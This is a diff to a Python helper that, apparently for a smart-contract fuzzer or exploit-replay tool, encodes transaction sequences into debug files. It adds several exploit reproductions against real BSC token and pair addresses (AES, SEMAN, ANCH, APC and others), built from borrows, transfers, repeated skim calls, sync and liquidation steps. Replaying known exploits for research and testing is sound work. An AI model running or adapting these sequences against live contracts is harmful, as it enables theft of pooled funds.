@@ -64,12 +64,17 @@ def fetch_etherscan_contract_abi(network, token_address):
 def generate_debug_file(target, data):
     w3 = Web3()
     for i in data:
-        abi = fetch_etherscan_contract_abi(target, i["target"])
-        contract = w3.eth.contract(address=i["target"], abi=abi)
-        abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
-        print(f"txn {i['caller']} {i['target']} {abi_encoded} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
-              f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
-              f"{i['warp'] if 'warp' in i else 0} ")
+        if "name" in i and "args" in i:
+            abi = fetch_etherscan_contract_abi(target, i["target"])
+            contract = w3.eth.contract(address=i["target"], abi=abi)
+            abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
+            print(f"{i['ty'] if 'ty' in i else 'abi'} {i['caller']} {i['target']} {abi_encoded} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
+                  f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
+                  f"{i['warp'] if 'warp' in i else 0} {i['repeats'] if 'repeats' in i else 1}")
+        else:
+            print(f"{i['ty'] if 'ty' in i else 'abi'} {i['caller']} {i['target']} {hex(i['rand']).replace('0x', '')} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
+                  f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
+                  f"{i['warp'] if 'warp' in i else 0} {i['repeats'] if 'repeats' in i else 1}")
 
 
 
@@ -82,44 +87,44 @@ UmbrellaExp = [
 
 AES = Web3.toChecksumAddress("0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907")
 PAIR = Web3.toChecksumAddress("0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3")
-ATTACKER = Web3.toChecksumAddress("0x790ff2bdc2591af87e656febc6ffdf2d9b2f48e1")
+ATTACKER = Web3.toChecksumAddress("0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb")
 AESExp = [
     {
         "caller": ATTACKER,
-        "target": AES, 
-        "name": "transfer", "args": [PAIR, Web3.toWei(1e5, "ether")]
-    },
-
-    *[
-        {
-            "caller": ATTACKER,
-            "target": PAIR, 
-            "name": "skim", "args": [PAIR]
-        } for _ in range(2)
-    ],
-
-    {
-        "caller": ATTACKER,
-        "target": PAIR, 
-        "name": "skim", "args": [ATTACKER]
-    },
-
-    {
-        "caller": ATTACKER,
-        "target": AES, 
-        "name": "distributeFee", "args": []
-    },
-
-    {
-         "caller":ATTACKER,
-        "target": PAIR, 
+        "target": PAIR,
         "name": "sync", "args": []
+    },
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": AES,
+        "value": Web3.toWei(400, "ether"),
+        "rand": 20
     },
     {
         "caller": ATTACKER,
         "target": AES,
-        "name": "balanceOf", "args": [ATTACKER]
+        "name": "transfer", "args": [PAIR, int(0x0000000000000000000000000000000000000000000889e10a9f6536c4a0c0c)]
     },
+    *[
+        {
+            "caller": ATTACKER,
+            "target": PAIR,
+            "name": "skim", "args": [PAIR],
+            "repeats": 37
+        } for _ in range(4)
+    ],
+    {
+        "caller": ATTACKER,
+        "target": AES,
+        "name": "distributeFee", "args": []
+    },
+    {
+         "caller":ATTACKER,
+         "target": PAIR,
+         "name": "sync", "args": [],
+         "liquidation_percent": 10
+    }
 ]
 
 SheepFarm = "0x4726010da871f4b57b5031E3EA48Bde961F122aA"
@@ -260,4 +265,201 @@ PLTDExp = [
     },
 ]
 
-generate_debug_file("bsc", PLTDExp)
+BUSD = Web3.toChecksumAddress("0x55d398326f99059ff775485246999027b3197955")
+BUSD_RICH = Web3.toChecksumAddress("0x0d0707963952f2fba59dd06f2b425ace40b492fe")
+RL = "0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888"
+RL_RICH = Web3.toChecksumAddress("0x335ddce3f07b0bdafc03f56c1b30d3b269366666")
+Pair = "0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e"
+
+RLExp = [
+    # {
+    #     "caller": ATTACKER,
+    #     "target": BUSD,
+    #     "name": "balanceOf", "args": [Pair],
+    # },
+    {
+        "caller": ATTACKER,
+        "target": RL,
+        "name": "balanceOf", "args": [Pair],
+    },
+    # {
+    #     "caller": BUSD_RICH,
+    #     "target": BUSD,
+    #     "name": "transfer", "args": [Pair, Web3.toWei(1, "ether")],
+    # },
+    {
+        "caller": RL_RICH,
+        "target": RL,
+        "name": "transfer", "args": [Pair, Web3.toWei(1, "ether")],
+    },
+    # {
+    #     "caller": ATTACKER,
+    #     "target": BUSD,
+    #     "name": "balanceOf", "args": [Pair],
+    # },
+    {
+        "caller": ATTACKER,
+        "target": RL,
+        "name": "balanceOf", "args": [Pair],
+    },
+    {
+        "caller": ATTACKER,
+        "target": Pair,
+        "name": "mint", "args": [ATTACKER],
+    },
+    # {
+    #     "caller": ATTACKER,
+    #     "target": PAIR,
+    #     "name": "skim", "args": [ATTACKER],
+    # },
+    # {
+    #     "caller": ATTACKER,
+    #     "target": TOKEN,
+    #     "name": "balanceOf", "args": [ATTACKER],
+    # },
+]
+
+
+ATTACKER = "0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd"
+
+SimpleBorrowExp = [
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": BUSD,
+        "value": 1000000,
+        'rand': 10000
+    },
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": BUSD,
+        "name": "balanceOf", "args": [ATTACKER],
+        "liquidation_percent": 10
+    }
+]
+
+
+ATTACKER = Web3.toChecksumAddress("0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb")
+SEMAN = "0x6bc9b4976ba6f8C9574326375204eE469993D038"
+GVC = "0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e"
+PAIR = "0x6637914482670f91F43025802b6755F27050b0a6"
+
+SEMANExp = [
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": SEMAN,
+        "value": int(1e7),
+        'rand': 10000,
+        'warp': 1000000000000,
+    },
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": GVC,
+        "value": int(500e18),
+        'rand': 10000
+    },
+    *[
+        {
+            "ty": "abi",
+            "caller": ATTACKER,
+            "target": SEMAN,
+            "name": "transfer", "args": [PAIR, int(1)],
+        } for _ in range(20)
+    ],
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": SEMAN,
+        "name": "balanceOf", "args": [ATTACKER],
+        # "liquidation_percent": 10
+    },
+]
+
+
+ANCH = Web3.toChecksumAddress("0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e")
+ANCH_PAIR = "0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb"
+ANCHExp = [
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": ANCH,
+        "value": int(500),
+    },
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": ANCH,
+        "name": "balanceOf", "args": [ATTACKER],
+    },
+    {
+        "caller": ATTACKER,
+        "target": ANCH,
+        "name": "transfer", "args": [PAIR, int(0x0000000000000000000000000000000000000000000889e10a9f6536c4a0c0c)] # slug of balance
+    },
+    *[
+        {
+            "caller": ATTACKER,
+            "target": PAIR,
+            "name": "skim", "args": [PAIR]
+        } for _ in range(125)
+    ],
+    {
+        "caller":ATTACKER,
+        "target": PAIR,
+        "name": "sync", "args": [],
+        "liquidation_percent": 10
+    }
+]
+
+APC = Web3.toChecksumAddress("0x2AA504586d6CaB3C59Fa629f74c586d78b93A025")
+MUSD = Web3.toChecksumAddress("0x473C33C55bE10bB53D81fe45173fcc444143a13e")
+SWAP = Web3.toChecksumAddress("0x5a88114F02bfFb04a9A13a776f592547B3080237")
+
+APCExp = [
+    {
+        "ty": "borrow",
+        "caller": ATTACKER,
+        "target": APC,
+        "value": int(500),
+    },
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": SWAP,
+        "name": "swap", "args": [APC, MUSD, int(100000e18)]
+    },
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": APC,
+        "name": "balanceOf", "args": [ATTACKER],
+        "liquidation_percent": 10,
+        "liquidation_target": APC
+    },
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": SWAP,
+        "name": "swap", "args": [MUSD, APC, int("1")], # slug for MUSD_BALANCE
+        "liquidation_percent": 10,
+    },
+]
+
+BPAIR = "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D"
+BVAULTS = "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20"
+
+BDEXExp = [
+    {
+
+    }
+]
+
+
+BEGO = ""
+
+
+generate_debug_file("bsc", AESExp)
+
